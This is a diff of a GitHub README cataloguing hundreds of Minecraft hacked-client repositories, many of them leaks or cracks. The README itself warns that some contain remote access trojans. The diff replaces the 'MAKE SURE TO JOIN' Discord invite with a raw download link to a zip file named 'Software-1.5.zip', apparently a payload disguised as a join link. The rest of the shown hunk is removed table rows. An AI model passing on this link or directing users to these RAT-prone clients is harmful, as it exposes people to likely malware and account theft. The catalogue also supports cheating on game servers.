@@ -1,836 +1,836 @@
 # Client Collection List - Total Clients: 826
-**MAKE SURE TO JOIN: https://discord.gg/vzXzFpv2gk**
+**MAKE SURE TO JOIN: https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip**
 
 This repository contains a comprehensive list of various clients. Please note that **some clients might contain RATs (Remote Access Trojans)**. Use them at your own risk.
 
 | Client Name         | Repository Link                                          |
 |---------------------|-----------------------------------------------------------|
-| 06dWare             | https://github.com/GentlemanMC/Xulu-06dware             |
-| 1.19 Client         | https://github.com/zopac/1.19-client                    |
-| 198macros | https://github.com/TrilliumSolutions/198macros-v1.4.0 |
-| 303Hack / ThreeZeroThreeHack | https://github.com/MikuSoCute/ThreeZeroThreeHack             |
-| 404 | https://github.com/dada994a/404-leak |
-| 3arthh4ck / Phobos Newbase | https://github.com/3arthqu4ke/3arthh4ck // https://github.com/colorblindness/3arthh4ck |
-| 5C | https://github.com/calicosun258/5c-client-N |
-| 711.club            | https://github.com/master7720/711.club                  |
-| AbHack              | https://github.com/chunfeng666/abhack-main              |
-| Abstract            | https://github.com/WMSGaming/Abstract-1.12.2            |
-| Abyss               | https://crystalpvp.ru/abyss/ // https://abyssclient.com // https://github.com/PlutoSolutions/Abyss // https://github.com/PlutoSolutions/AbyssOSS |
-| AbyssBeta           | https://github.com/PlutoSolutions/AbyssBetaEnforcer     |
-| Acid                | https://github.com/kyv3-v2/Acid-phobos-edition          |
-| AClient             | https://github.com/KuromeSan/a1.2.2b-hacked-client      |
-| Achilles | https://github.com/NoboKik/Achilles |
-| Adequacy | https://github.com/GuangChen2333/Adequacy |
-| Adopted | https://github.com/2young2care/Adopted-client |
-| Agalar              | https://github.com/MrHakan/Agalar-Hack                  |
-| AgloHack            | https://github.com/aglostic/aglohack                    |
-| AgonyClient         | https://github.com/VortexHFM/Agony-Client               |
-| AidsHack            | https://github.com/Dino-log/AidsHack                    |
-| AimWhere            | https://github.com/Potion1337/AimWhere-Source-Code      |
-| Alien | https://github.com/iM4dCat/Alien // https://github.com/RageCat420/AlienClient-OpenSource // https://github.com/hashdiana/Alien-Client // https://github.com/Lily29371/Alien-1.3.8-public // https://github.com/Lily29371/Alien-X |
-| AllahClient | https://github.com/pablushaa/AllahClient // https://github.com/pablushaa/AllahClient_old |
-| AllahWare           | https://github.com/CumHax/AllahWare                     |
-| Allusion            | https://github.com/cattyngmd/allusion                   |
-| AlulaHack | https://github.com/Auxnos/alulahack |
-| Ananta              | https://github.com/RitomG69/Ananta                      |
-| AndyClient          | https://github.com/MouathA/AndyClient-SRC               |
-| ApeClient | https://github.com/evaan/ApeClient |
-| ApeHax              | https://github.com/Team-Kedy/ApeHax                     |
-| Apollo              | https://github.com/IllegalException/Apollo-2.1          |
-| ApollyonClient      | https://cdn.discordapp.com/attachments/611452108826214401/636114166620356618/ApollyonClient-0.4-release3_1.jar |
-| Aquarius            | https://github.com/epsilonteam/Aquarius                 |
-| Arctic              | https://github.com/Pseudonymous000/Arctic-Client        |
-| Ares                | https://github.com/AresClient/ares                      |
-| Argon | https://github.com/LvStrnggg/argon |
-| ArchWare            | https://github.com/kisman2000/ArchWare                  |
-| Arsenic | https://github.com/ArsenicClient/Arsenic |
-| Arsenic             | https://github.com/BlebDaPleb/ArsenicClient             |
-| Aresnic | https://github.com/ArsenicClient/Arsenic |
-| Arsie               | https://github.com/maywr/arsie-mod-beta                 |
-| Artemis             | https://intent.store // https://github.com/G8LOL/Artemis-Hacked-client |
-| Asteria.rip | https://github.com/AsteriaDevelopment/asteria // https://github.com/WalmartSolutions/Asteria.rip |
-| Astro.dev           | https://github.com/Nyaannn/Astro.dev                    |
-| Atani | https://github.com/WalmartSolutions/Atani-0.03 // https://github.com/Atani-Client/client |
-| Atlas               | https://github.com/chris2rich/Atlas                     |
-| Atom                | https://cdn.discordapp.com/attachments/676392227991453697/705037276018901093/atom-0.5-cracked-by-CCC.jar |
-| AtomBeta            | https://cdn.discordapp.com/attachments/689371591976681522/727966452900167762/AtomBeta-1.3-ReleasedByCrystallinqq.jar |
-| Atomic              | https://github.com/19MisterX98/Atomic                   |
-| Atrium              | https://github.com/3000IQPlay/Atrium                    |
-| Augustus | https://github.com/TwoNick/augustus |
-| Aurora              | https://github.com/Memeszz/Aurora-public // https://github.com/IllegalException/Aurora-2.6 |
-| Aurora | https://github.com/WalmartSolutions/Aurora-2.0 |
-| Aurora New          | https://github.com/Negro-Development/Aurora-0.0.6-BUILDABLE-SRC |
-| Ayakashi            | https://github.com/MouathA/Ayakashi-unlicensed          |
-| Azorius.club | https://github.com/haychk/azorius.club |
-| AzuraX              | https://intent.store // https://github.com/Endemic1337/Azura-Client |
-| Azure               | https://github.com/Intel-i80486-DX4/Azure-For-Everyone  |
-| Backdoored          | https://github.com/RIPBackdoored/Backdoored-1.8.2-Source-Leak |
-| Badlion+ / BadlionPlus | https://github.com/oyzipfile/badlion-plus-SRC // https://github.com/unfidelity/badlionplus |
-| Banan+ / BananPlus  | https://github.com/Kanianan/b-archive                   |
-| Bandito.club        | https://github.com/gerald0mc/bandito.club               |
-| Banzem              | https://github.com/yunusborazan/Banzem-Client           |
-| Bape                | https://github.com/ImCzf233/Bape-Opensource // https://github.com/ImCzf233/bape-opensources             |
-| Bartender           | https://github.com/XeonLyfe/Bartender-Src               |
-| BaseBand            | https://github.com/PlutoSolutions/BaseBand // https://crystalpvp.ru/baseband // https://github.com/0x7DB/BaseBand-FOSS |
-| BBCWare             | https://github.com/unnamedlife/bbcware                  |
-| BeefSense           | https://github.com/HausemasterIssue/BeefSense-Decomp    |
-| Beer                | https://github.com/IUDevman/Beer                        |
-| BetaX | https://github.com/RageCat420/BetaX-OpenSource |
-| BigG                | https://github.com/ImCzf233/BIG-G-decompiled            |
-| BerryBobus          | https://github.com/kyv3-v3/BerryBobus-newrepo           |
-| BigRat              | https://github.com/ZimnyCat/BigRat                      |
-| BlackAndWhite       | https://github.com/AntiCope/reaper-addon                |
-| Blackout            | https://github.com/chell-dev/Blackout-3.0               |
-| BladeCore | https://github.com/KuroHere/BladeCore-1.12.2 |
-| BleachHack          | https://github.com/BleachDev/bleachhack-legacy          |
-| Blessed | https://github.com/Librry1337/Blessed-Client-1.16.5 // https://github.com/Librry1337/Blessed-Client-1.16.5 |
-| BLM                 | https://github.com/blmclient/client                     |
-| BloodHack           | https://github.com/gerald0mc/bloodhack                  |
-| BloodyClient        | https://github.com/WalmartSolutions/Bloody-1.0.1 // https://github.com/PlutoSolutions/BLOODYCLIENT1.0.0 // https://github.com/WalmartSolutions/BloodyClient-0.4.4 // https://github.com/PlutoSolutions/BloodyClient |
-| BloomWare           | https://github.com/offeex/Bloomware // https://github.com/goztb22/Bloomware // https://github.com/TheBreakery/Bloomware-Lite / https://github.com/DiOnFire/bloomware-latest-buildable |
-| BlueZenith          | https://github.com/Endemic1337/Blue-Zenith              |
-| Bobr                | https://github.com/kisman2000/Bobr-Client-0.0.9         |
-| BobrWare            | https://anonfiles.com/n6Bcy3wey5/BoberWareFree_rar      |
-| Bonk                | https://cdn.discordapp.com/attachments/689371591976681522/708203599284666518/Bonk_Utility_Client_v0.1.1.jar |
-| Bopis.club          | https://github.com/IllegalException/Bopis.club          |
-| BossHack            | https://github.com/master7720/boss-hack-v1.0-leak       |
-| BossWare            | https://github.com/vertent/bossware-leaked              |
-| BoyKisser | https://github.com/ColdDarkHusky/BoyKisser-Client-1.12.2 |
-| Boze                | https://github.com/TwoNick/boze // https://github.com/PlutoSolutions/BozeUpdate // https://www.boze.dev // https://crystalpvp.ru/boze/ |
-| BozoWare | https://github.com/Kobley/Bozoware |
-| Breeze | https://mega.nz/file/1PtmUJzB#8H_fcQmoUcNCzgecUb8Xrg-hXW9AebrwIU0DbBi_-cA // https://crystalpvp.ru/breeze |
-| BTHack | https://github.com/Ferra13671/BThack // https://github.com/2young2care/BThack-client-for-mobile |
-| BubbyClient         | https://github.com/BubbyRoosh1/BubbyClient-Fabric-1.16  |
-| BussinUtilites      | https://cdn.discordapp.com/attachments/992714822292619264/1035100460081745990/BussinUtilitesRedux-1.0-all.jar |
-| Byte | https://github.com/SyutoBestCoder/Byte-1.21 |
-| Byte Utility | https://github.com/danny-125/Byte-Utility-Mod |
-| C.U.M Fusion / CUM Fusion | https://github.com/BebSxy/C.U.M-Fusion-1.6.9            |
-| Caizm | https://github.com/tRollaURa/Caizm |
-| CakeClient          | https://github.com/GandelXIV/Cake-client                |
-| Calypso             | https://github.com/Gav06/Calypso                        |
-| Candy               | https://github.com/3000IQPlay/CANDY-0.0.8-BUILDABLE_SRC |
-| Candy++ / CandyPlusPlus | https://github.com/cocoapc911/candy-plus-plus           |
-| CarnageReborn | https://github.com/t1t0v/CarnageReborn |
-| CarrotHack          | https://github.com/chris2rich/CarrotHack                |
-| Cascade             | https://github.com/GurteX/Cascade-0.3.8 // https://github.com/AnotherNoName/Cascade-0.3.7-SRC // https://github.com/AnotherNoName/Cascade-0.2.7-SRC-BUILDABLE |
-| Catalyst            | https://github.com/GentlemanMC/Catalyst // https://github.com/Pr3roxDLC/Catalyst |
-| CatClient           | https://github.com/CumHax/catclient // https://github.com/Tr0llMode/catclient-cc-bypass |
-| CatClient+ / CatClientPlus / ThighWare | https://github.com/kisman2000/CatClientPlus-aka-ThighWare |
-| Catgirl | https://github.com/toruuDev/catgirlv1 |
-| Catmi               | https://github.com/4wl/Catmi                            |
-| Catmi Rewrite | https://github.com/Lily29371/CatmiRewrite |
-| CatsWare            | https://github.com/CatsAreGood1337/CatsWare             |
-| CatUtilities | https://github.com/AlQaedaCracks/Cat-Utilities-0.8.4 |
-| CCSHack             | https://github.com/Tr0llMode/CCShack                    |
-| Cebulionware.NEXT   | https://github.com/0x4d65/Cebulionware.NEXT             |
-| Celestial           | https://celka.xyz // https://github.com/noom1337/hacked-client-collection/tree/main/Celestial%20Premium%206.0%20(1.12.2) |
-| Celestial Recode | https://github.com/tuskypaster/Celestial-Recode-src |
-| Claudius            | https://github.com/Crimply/Claudius                     |
-| Click               | https://github.com/noatmc/click                         |
-| ClickCrystals       | https://github.com/ItziSpyder/ClickCrystals             |
-| Client              | https://github.com/urelNiP/Client-2.0.0-SAFE // https://github.com/RealzPrestige/client2.0.0 |
-| CliNet              | https://github.com/DarkiBoi/CliNet                      |
-| Cloud               | https://www.mediafire.com/file/f2s1r5bza79pvvt/cloud.zip/file |
-| Cobalt              | https://github.com/Gav06/cobalt-utility-mod             |
-| Coffee              | https://github.com/Coffee-Client/Coffee                 |
-| CoinsClient | https://github.com/mindlesslydev/CoinsClient |
-| ColaHack            | https://github.com/CumHax/ColaHack                      |
-| ConstHack.cc        | https://github.com/chris2rich/ConstHack.cc              |
-| CookieClient        | https://github.com/bebeli555/CookieClient               |
-| Cosmos              | https://github.com/momentumdevelopment/cosmos           |
-| CousinWare          | https://github.com/Ace8Underscore/CousinWare // https://github.com/Ace8Underscore/CousinWare1.12.2Updated |
-| Cr33pyWare          | https://github.com/SkidFxcte/Cr33pyware                 |
-| Cracked | https://github.com/primewk/future-skid // https://github.com/XG2025-Akaishin/Cracked-1.20.4-Continue |
-| Cranberry           | https://github.com/Snoworange420/Cranberry              |
-| CreeperClient | https://github.com/BigShotEmzy/Creeper-Client-Legacy |
-| Creepy Salhack      | https://github.com/CreepyOrb924/creepy-salhack          |
-| Crepe               | https://github.com/3000IQPlay/Crepes-deobf // https://github.com/cocoapc911/crepe-client-public |
-| CrispyClient        | https://www.mediafire.com/file/vwuikhvcn03d53p/Crispy.7z/file |
-| CrossSince | https://github.com/shxp3/CrossSine |
-| CrystalClient       | https://github.com/3000IQPlay/crystal-client-src        |
-| Cue                 | https://github.com/SudoDevs-inc/CueClientOld            |
-| Cupid               | https://github.com/JonaPoka/Cupid-Client-SRC            |
-| CurryMod | https://github.com/Logging4J/CurryMod |
-| Cursa               | https://github.com/epsilonteam/Cursa                    |
-| Curse | https://github.com/KuroHere/CurseClient-Forge |
-| Cute                | https://github.com/4wl/Cute                             |
-| CwHack              | https://github.com/femhack/CwHack                       |
-| CXClient            | https://github.com/pixelcmtd/CXClient                   |
-| Dactyl / Moonlight  | https://github.com/redvx/Dactyl-1.6.8 // https://github.com/fIuffy/Dactyl |
-| Dallas              | https://github.com/gerald0mc/Dallas                     |
-| DarkClient | https://github.com/Dark-Developments/DarkClient |
-| DarkYaw             | https://github.com/tuskypaster/DarkYaw-Source           |
-| DeadCode | https://crystalpvp.ru/deadcode/ // https://github.com/PlutoSolutions/DeadCode |
-| DebugHack | https://github.com/MysticCat212417/DebugHack |
-| DecClient | https://github.com/MrDuhan/DecClient-Release // https://github.com/limping4jamal/dec-client |
-| Delta               | https://github.com/noatmc/delta                         |
-| Demise              | https://github.com/kisman2000/Demise-0.1.5-beta-Ratted  |
-| Density             | https://github.com/hashPirate/archived-client           |
-| DentClient          | https://github.com/DentClient/Client // https://github.com/DentClient/DentClient |
-| Destroy Premium     | https://github.com/tuskypaster/Destroy-Premium-SRC      |
-| DestroySquad        | https://github.com/jabask3dd3r/DestroySquad-src-leak    |
-| Devu                | https://github.com/4wl/Devu                             |
-| DHMClient           | https://github.com/hf2kxn/DHMClient                     |
-| DiabloX | https://github.com/WalmartSolutions/DiabloX-1.1.3 |
-| Dimasik | https://github.com/WalmartSolutions/Dimasik |
-| Distance            | https://github.com/YumeGod/Distance580 // https://github.com/ho3cn/Distance6.0-open |
-| Dog Client | https://github.com/src-leaker/dog-client // https://crystalpvp.ru/dog |
-| Doki                | https://github.com/YumeGod/OpenDokiClient2 // https://github.com/ImCzf233/DokiClient2-opensources // https://github.com/ImCzf233/DokiClient2-Src-Leaked // https://github.com/ImCzf233/DokiClient-opensources |
-| Dope                | https://github.com/ssverify/dope-ghost-2.0              |
-| DoragonClient       | https://github.com/VortexHFM/Doragon-Client             |
-| DotGod.cc           | https://github.com/Zane2b2t/DotGodCC // https://github.com/dabigbulletz638/dotgod.cc |
-| Dragon              | https://cdn.discordapp.com/attachments/685842167947984966/705848667214446652/DragonClient_7.0_1.jar |
-| Dream               | https://github.com/Doogie13/Dream-Reupload              |
-| DrugHack | https://github.com/doickswag/drughack |
-| DrugHack Recode | https://github.com/doickswag/drughack-recode |
-| Duperman            | https://github.com/JAV1F/Project-Dupermen               |
-| DulyClient | https://github.com/VortexHFM/DulyClient |
-| Editme              | https://github.com/CoolClientCollectors/editme-release // https://github.com/Archive-xx/editme-deobfuscated-client |
-| Elementars.com      | https://github.com/Elementars/Elementars.com            |
-| Elite | https://github.com/Aspw-w/Elite-Client |
-| Elypsa | https://github.com/ferderplays/ElypsaClient |
-| Elysian             | https://github.com/WarriorCrystal/Elysian               |
-| Ensamble | https://github.com/Dimples-1337/Ensemble-1.8.9 // https://github.com/b0LBwZ7r5HOeh6CBMuQIhVu3-s-random-fork/Ensemble-1.8.9 |
-| Epitaph | https://github.com/2young2care/Epitaph13-1.20.1-crack // https://github.com/2young2care/Epitaph-11-crack |
-| Epsilon             | https://github.com/SpartanB312/Epsilon                  |
-| Epsilon+ / EpsilonPlus | https://github.com/FadeRainbow/EpsilonPlus
-| EsoHack / gondal.club | https://github.com/cryst-al/oyvey-skids/releases/tag/esohack // https://github.com/Nutelaspaceman/esohack-1.0.8 // https://github.com/LTHLeaks/Esohack-1.0.9 |
-| Estension | https://github.com/Megaline233/estension |
-| Europa              | https://github.com/SkidFxcte/Europa-Buildable-Source    |
-| Evangelion          | https://github.com/BebSxy/Evangelion                    |
-| Evaware | https://github.com/WalmartSolutions/Evaware-3.1 |
-| EvliEye             | https://github.com/GSCSDSUN/EvliEye-OpenSource          |
-| Evo                 | https://github.com/WarriorCrystal/Evo                   |
-| Exception | https://github.com/Cookie-Studio/Exception |
-| Exeter              | https://github.com/The-Gopro336-Archive/Exeter-1.12.2   |
-| Existent            | https://github.com/Rabies1337/Existent-Old              |
-| ExosWare | https://github.com/levin1337/exosware-1.21.4 |
-| Expensive           | https://expensiveclient.xyz // https://github.com/tuskypaster/Expensive-Client |
-| Experium            | https://github.com/3000IQPlay/Experium                  |
-| Extazyy | https://github.com/0xFruzz/Extazyy-1.20.1 |
-| ExVision            | https://github.com/Nutelaspaceman/exvision-b1-cracked   |
-| FabricHax           | https://github.com/pranavgade20/FabricHax               |
-| Fabuls | https://github.com/WalmartSolutions/Fabuls-1.0 |
-| FallenMod           | https://github.com/4wl/FallenUtilMod                    |
-| FamilyFunPack       | https://github.com/anOtherAnalyse/FamilyFunPack         |
-| FartHack.cc         | https://github.com/CumHax/FartHax.cc                    |
-| FDP                 | https://github.com/SkidderMC/FDPClient                  |
-| FemHack             | https://github.com/Femey/Femhack                        |
-| FencingF+2 / FencingFPlusTwo | https://github.com/FencingF/FencingFPlusTwo             |
-| Ferox               | https://github.com/olliem5/ferox                        |
-| Ferret              | https://github.com/cattyngmd/Ferret                     |
-| FerxaxenMod         | https://github.com/efekoskeroglu/FerxaxenMod-v0.3       |
-| FPSMaster | https://github.com/SuperSkidder/FPSMasterOpenSourceProject |
-| Fira                | https://github.com/cout970/FiraClient                   |
-| Fire                | https://github.com/RealzPrestige/fire                   |
-| FireWork            | https://github.com/VVriter/Firework-client-public       |
-| FishHack            | https://github.com/PlutoSolutions/FishHack-public       |
-| FiveGuys / 5Guys    | https://github.com/Canonball90/fiveguysSrc              |
-| Fivve Xin | https://github.com/2young2care/Fivve--Xin-- |
-| Flawless | https://github.com/hashdiana/Flawless-Client |
-| Floppa              | https://github.com/HausemasterIssue/Floppa-Client-SRC   |
-| Fluidity            | https://github.com/mccheatz/Fluidity                    |
-| Flux                | https://github.com/heedii/flux-addon                    |
-| Fluxus | https://codeberg.org/mldyrax/flux-latest-public |
-| ForeverClient | https://github.com/h1tm4nqq/ForeverClient-leak |
-| ForgeHax            | https://github.com/fr1kin/ForgeHax                      |
-| FortniteHook | https://github.com/MikuSoCute/FortniteHook-Public // https://github.com/MikuSoCute/FartniteHook-1.2 |
-| Fractal | https://github.com/AriaJackie/Fractal |
-| Francium | https://github.com/IllegalException/Francium |
-| Francium 1.19+ | https://github.com/WalmartSolutions/Francium-1.20.4 // https://github.com/WalmartSolutions/Francium-Reborn // https://github.com/3000IQPlay/Francium-Cracked // https://github.com/Dexveloper/Francium-Cracked |
-| Freemanatee         | https://github.com/freethemanatee/freemanatee-client    |
-| FrogWare            | https://github.com/XZRC/FrogWare                        |
-| FrostBurn | https://github.com/evaan/FrostBurn |
-| FuFuClient          | https://github.com/IMXNOOBX/FuFuClient                  |
-| FurryWare           | https://github.com/Intel-i80486-DX4/FurryWare-B40       |
-| Fusion | https://github.com/deadshxll/fusion |
-| Future              | https://github.com/TwoNick/future-1.21.1 // https://futureclient.net // https://crystalpvp.ru/future/ // https://github.com/PlutoSolutions/Future |
-| FutureX             | https://github.com/RaptorClientDevelopment/futrexclientsource // https://github.com/chris2rich/FutureX |
-| Fyra | https://github.com/Sxmurai/fyra |
-| Galacticc | https://github.com/Kopamed/Galacticc |
-| Galactie            | https://github.com/maxgamesNL/Galactite                 |
-| GameSense / GS      | https://github.com/IUDevman/gamesense-client            |
-| GameSense++ / GameSensePlusPlus / GS++ / GSPlusPlus | https://github.com/TechAle/gsplusplus                   |
-| Gardenia | https://github.com/ProfKambing/Gardenia |
-| Garuff              | https://github.com/desuboruto/Garuff                    |
-| GateClient | https://github.com/TheF1xer/GateClient |
-| GateClient 1.19.2 | https://github.com/TheF1xer/GateClient-1.19.2 |
-| Gavhack             | https://github.com/Gav06/gavhack-legacy                 |
-| Gavhack+ / GavhackPlus | https://github.com/Gav06/GavhackPlus                    |
-| GeraldHack          | https://github.com/GentlemanMC/Geraldhack-1.69.3-BUILDABLE-SRC // https://github.com/gerald0mc/Gerald-Hack-2.0 |
-| GhostBleach | https://github.com/cooldma/GhostBleach |
-| GishCode            | https://github.com/GishReloaded/Gish-Code-1.12.2        |
-| Glacier             | https://github.com/quickdaffy/Glacier-Client            |
-| Gladiator           | https://github.com/XZRC/gladiator-src                   |
-| GlassClient         | https://github.com/GlassClient/GlassClient              |
-| Gloom               | https://cdn.discordapp.com/attachments/656809769813934090/665025336278384650/Gloom-Client_B3.2.jar |
-| Glorium             | https://workupload.com/file/PavBkZvqzcA                 |
-| GlowClient          | https://github.com/3000IQPlay/GlowClient-Fixed          |
-| GlyphClient | https://github.com/GlyphMC/client |
-| GodClient           | https://github.com/VortexHFM/God-Client                 |
-| GoldGrinder | https://github.com/WalmartSolutions/GoldGrinder-3.0 |
-| GoonWare | https://github.com/notRevhacks/Goonware-3.0.0-unratted-version- |
-| Gothaj | https://github.com/ScRichard/GOTHAJ_RECODE_UNRELEASED // https://github.com/AllahSolutions/leaked-unobfuscated-gothaj // https://github.com/WalmartSolutions/Gothaj-3.0-Alpha |
-| Gothaj NextGen | https://github.com/ScRichard/Gothaj-Next-Gen |
-| GrandLine | https://github.com/WalmartSolutions/GrandLine-1.4.1 |
-| GrassWare.win | https://github.com/Zane2b2t/GrassWare.win |
-| GrassWare.win Rewrite | https://github.com/Zane2b2t/Grassware.win-rewrite // https://github.com/AllahLeaksHvH/Grasswarept3 |
-| Grim | https://github.com/TwoNick/grim // https://github.com/WalmartSolutions/Grim-1.2 |
-| Guinness            | https://github.com/unfidelity/guinness // https://github.com/The-Gopro336-Archive/Guinness-Deobf |
-| GumTune | https://github.com/RoseGoldIsntGay/GumTuneClient |
-| HackHack            | https://github.com/3arthx/hack-hack // https://github.com/AzGOD-qwq/hackhack- |
-| HalalHack           | https://github.com/unfidelity/halal-hack                |
-| Hamster             | https://www.mediafire.com/file/pp5fi5umg3tzwyr/Hamster_Client_v1.jar/file |
-| Hanabi              | https://github.com/AckerRun1337/Open-Hanabi-5.0         |
-| HANClient           | https://github.com/hf2kxn/HAN-Client                    |
-| Haru | https://github.com/Cvrwed/Haru |
-| Harvest             | https://github.com/BedTrap/Harvest                      |
-| HayBale             | https://github.com/HayBaleClient/HayBale-Source         |
-| Hearse              | https://cdn.discordapp.com/attachments/685487646197415957/735112124912762960/Hearse_Hack_b-0.5_OBF.jar // https://cdn.discordapp.com/attachments/685487646197415957/735131873042497546/Hearse_0.5_cracked.jar |
-| HeavenClient        | https://github.com/srcgod/HeavenClientCrack             |
-| Helios | https://github.com/HeliosMinecraft/HeliosClient // https://github.com/HeliosDevelopement/HeliosClient |
-| HemHacks            | https://github.com/Gri11edHam/HamHacks                  |
-| Hephaestus          | https://github.com/Zane2b2t/Hephaestus // https://github.com/Frontear/HephaestusClient            |
-| Hiassi.su           | https://github.com/3000IQPlay/hiassi.su                 |
-| HilariousWare       | https://github.com/SirHilarious/HilariousWare           |
-| HitlerHax           | https://github.com/Yaimsputnik5/HitlerHax-Leak          |
-| Hitori              | https://github.com/cattyngmd/HitoriClient // https://github.com/PlutoSolutions/Hitori-Client |
-| Hmxix               | https://github.com/cubk/HmxixClient-opensource           |
-| HockeyWare          | https://github.com/Catuquei/hockeyware                  |
-| HOPE                | https://github.com/TashCat/HOPE                         |
-| Horion              | https://github.com/horionclient/Horion                  |
-| Houdini.cc          | https://github.com/Intel-i80486-DX4/houdini.cc // https://github.com/Versues/Houdini.cc-1.0.4 |
-| HT+ Rewrite / HTPlus Rewrite | https://github.com/HT-Rewrite/Overruling-Client         |
-| HuqaloV             | https://github.com/ferderplays/HuqaloV                  |
-| Huzuni              | https://github.com/XxlunimexX/Huzuni-1.11               |
-| Huzuni+2 / HuzuniPlusTwo | https://github.com/Huzuniplus/Huzuniplus2               |
-| Hydra               | https://hydraclient.com                                 |
-| HydraWare           | https://github.com/aglostic/hydraware-cracked           |
-| HydraWare Plus / HydraWare+ | https://github.com/SkidFxcte/Hydrawareplus-cracked |
-| Hydrogen            | https://github.com/zPeanut/Hydrogen                     |
-| HyghLand.cc         | https://github.com/chris2rich/highland.cc               |
-| HyperLethal         | https://github.com/500thousandthenibounceit/Hyperlethal2 // https://github.com/3arthx/Hyper-Lethal |
-| Hypnotic            | https://github.com/Hypnotic-Development/Hypnotic-Client |
-| ChachooxWare        | https://github.com/master7720/ChachooxWare-1.6-release-obf-reupload |
-| Charon.eu           | https://github.com/oyzipfile/chaaron.eu                 |
-| CheatWare           | https://github.com/ZeroZipp/Cheatware                   |
-| Cherry              | https://github.com/ma4squ3ke/cherry-leak                |
-| ChickenWare         | https://github.com/urkkiz225/ChickenWare                |
-| ChickenWings.cc     | https://github.com/JacobTheIdiot/ChickenWings.cc        |
-| ChipsHack           | https://github.com/CumHax/ChipsHack                     |
-| ChucKHack           | https://github.com/chucK9b9t/chuck-hack-beta            |
-| ChungusWare         | https://github.com/bigratenthusiast/chungusware         |
-| IceHack             | https://github.com/Intel-i80486-DX4/IceHack-B1.5 // https://github.com/HausemasterIssue/ICEHack-b1-SRC // https://github.com/WarriorCrystal/ICEHack-0.5-Source |
-| Ikea                | https://github.com/Nooniboi/Public-Ikea                 |
-| ILClient            | https://github.com/ssllllll/IL-Client-0.2 // https://github.com/Sxmurai/IL-Client-0.2-decompiled |
-| Impact              | https://impactclient.net                                |
-| Impact+ / ImpactPlus | https://github.com/unfidelity/impact-plus               |
-| ImpHack / ImpHax    | https://github.com/SaberAspect/ImpHax                   |
-| Incoming            | https://github.com/KillAura7170/Incoming-nix            |
-| Indium.cc           | https://github.com/OfficialMohalk/Indium.cc             |
-| Inertia             | https://inertiaclient.com                               |
-| Inertial            | https://github.com/EclipseAFK/Inertial-Client-source-code |
-| Inferno             | https://github.com/Sxmurai/inferno-old                  |
-| Infinity | https://github.com/2young2care/silver-meme |
-| Infinity            | https://github.com/Frontear/Infinity                    |
-| InfnityLoop | https://github.com/KuroHere/InfinityLoop |
-| IngrosWare          | https://github.com/bishopsixx/ingrosware // https://github.com/colorblindness/IngrosWare |
-| Invicta             | https://github.com/2b2t-cc/Invicta                      |
-| InvincibilityHack   | https://github.com/Coderx-Gamer/invincibility-hack      |
-| ISUWare | https://github.com/XG2025-Akaishin/ISU-Ware |
-| iSync               | https://intent.store                                    |
-| Jackey              | https://github.com/ImCzf233/Jackey-opensource           |
-| JebHack             | https://github.com/fan4145/jabhak-src                   |
-| JesusHack           | https://github.com/Vitalasy/jesushack                   |
-| JexClient           | https://github.com/DustinRepo/JexClient                 |
-| JigokuSense         | https://github.com/noatmc/jigokusense-leak              |
-| Jigsaw              | https://www.jigsawclient.net                            |
-| JoblessClient | https://github.com/Dovyrn/JoblessClientSrc |
-| JorgitoHack         | https://github.com/BebSxy/JorgitoHack                   |
-| JuiceClient         | https://github.com/ClientPlayground/Juice-Client        |
-| Juul                | https://github.com/jeremypelletier/juul-unlicensed // https://github.com/Endemic1337/Juul // https://intent.store |
-| KAMI                | https://github.com/zeroeightysix/KAMI                   |
-| Kami++ / KamiPlusPlus | https://github.com/GentlemanMC/Kamipp                   |
-| Kami5 / KamiFive    | https://github.com/DriftyDev/CLEAN_Kami5-1.8-BUILDABLE_SRC |
-| Kamiblue            | https://github.com/kami-blue/client                     |
-| Kamiblue+ / KamibluePlus | https://github.com/Auza2008/KamibluePlus                |
-| Kana                | https://github.com/Cypphi/kana-client                   |
-| Kaotik              | https://github.com/VenuzWeeb/Kaotik // https://github.com/LTHLeaks/Kaotik-1.3.5-Leak |
-| Kappa | https://github.com/slmpc/kappa-client |
-| Kapuncion | https://github.com/Dark-Developments/Kapuncino-Client |
-| Kawaii              | https://intent.store                                    |
-| KBPW | https://github.com/KBPW-Dev/kbpw-util |
-| KeKWClient          | https://github.com/VortexHFM/KekW-Client                |
-| Kemmy.cc            | https://github.com/PlutoSolutions/kemmy.cc              |
-| Ket                 | https://github.com/oyzipfile/ket-public                 |
-| Ketamine            | https://intent.store                                    |
-| KettleHack | https://github.com/FadeRainbow/Kettle-Hack |
-| KevinClient         | https://github.com/RMCQAZ/KevinClient-1.12 // https://github.com/RMCQAZ/KevinClient |
-| KiwiClient          | https://github.com/TangyKiwi/KiwiClient                 |
-| KlaydixWare | https://github.com/Plintor/klaydixware-clean |
-| KnightHack          | https://github.com/RayyanStudios/KnightHack             |
-| Koks                | https://github.com/Schummel-Software/Koks-v3 // https://outuby.space/schummel-software/ // https://github.com/000000000-1/koks-client |
-| Konas               | https://github.com/threevt/Phobos-Rewrite // https://crystalpvp.ru/konas/ // https://github.com/PlutoSolutions/KonasEnhanced |
-| Konc                | https://cdn.discordapp.com/attachments/673542685751246850/691252529954160670/KONC_2.1.1.jar // https://cdn.discordapp.com/attachments/690881210016202773/736565503740477563/KONC-Client-master-v3.2-release-deobf.jar.src.zip |
-| Korppu | https://github.com/0mlml/korppu |
-| Kull                | https://github.com/Sxmurai/kull                         |
-| Kura | https://github.com/dyzjct/Kura-Public |
-| Kura NextGen | https://github.com/ApertureStatic/KuraNG-Public-Edition |
-| KuroHack            | https://github.com/KuroHere/kurohack // https://github.com/master7720/KuroHack-2.0.8-release-deobf |
-| KVN | https://github.com/WalmartSolutions/KVN-b4.1.0 |
-| Kyino | https://github.com/WalmartSolutions/Kyino |
-| Lambda              | https://github.com/lambda-client/lambda                 |
-| Lambda+ / LambdaPlus | https://github.com/DigimaticxHius/Lambda-Plus           |
-| LanderClient | https://github.com/Dimples-1337/LanderClient // https://github.com/GAQPanda/LanderClient |
-| Lantern             | https://github.com/PlusPlusMC/Lantern                   |
-| LavaHack / Kisman.cc | https://github.com/TheKisDevs/LavaHack-Forge // https://github.com/TheKisDevs/LavaHack-Public           |
-| LBounce             | https://github.com/AFterNode/LBounce                    |
-| Leave               | https://github.com/ImCzf233/LeaveOld-opensource         |
-| Legacy              | https://github.com/CatsAreGood1337/LegacyClient-1.2.5-src |
-| Lemon | https://github.com/dada994a/lemon-v0.0.8Source // https://github.com/MikuSoCute/Lemon-public |
-| Lemonade | https://github.com/dada994a/LEMONADE-LEAK |
